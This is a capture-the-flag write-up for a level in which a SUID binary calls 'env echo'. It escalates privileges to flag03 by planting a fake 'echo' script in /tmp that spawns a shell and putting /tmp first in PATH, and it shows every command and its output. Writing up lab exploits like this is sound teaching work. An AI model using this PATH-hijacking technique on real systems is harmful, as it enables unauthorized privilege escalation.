We start this level with a simple `ls` command and see a binary named `level03`. Running it:
```bash
./level03
```

It only prints:
```
Exploit me
```


We inspect the binary using `ls -l`:
```bash
ls -l level03
-rwsr-x---+ 1 flag03 level03 8627 Mar  5  2016 level03
```

The **SUID bit (`s`) is set**, meaning that when executed, it runs with the privileges of `flag03`. If we can exploit this, we might be able to switch to `flag03` and retrieve the next flag.

Using `strings level03`, we see a reference to:

```
/usr/bin/env echo Exploit me
```

The program **doesn't call `/bin/echo` directly** but instead runs `/usr/bin/env echo`. The key takeaway:
- `env` searches for `echo` in `$PATH`.
- We can **override `echo`** by placing a malicious script earlier in `$PATH`.

We create a fake `echo` script that spawns a shell:

```bash
echo -e '#!/bin/sh\n/bin/sh' > /tmp/echo
chmod +x /tmp/echo
```

This script does the following:
- `#!/bin/sh` → Ensures it runs in a shell.
- `/bin/sh` → Launches a new shell when executed.

Now, we **modify `$PATH`** so that our fake `echo` is found before the real one:

```bash
export PATH=/tmp:$PATH
```

We check if our `echo` is now being used:

```bash
which echo
```

Expected output:

```
/tmp/echo
```

Now, we run `level03` again:

```bash
./level03
```

Since the program runs `env echo`, it executes **our fake `echo`**, which spawns a shell **as `flag03`**.

To confirm our new identity:

```bash
whoami
```

Output:

```
flag03
```

Success! Now, we retrieve the flag:

```bash
getflag
```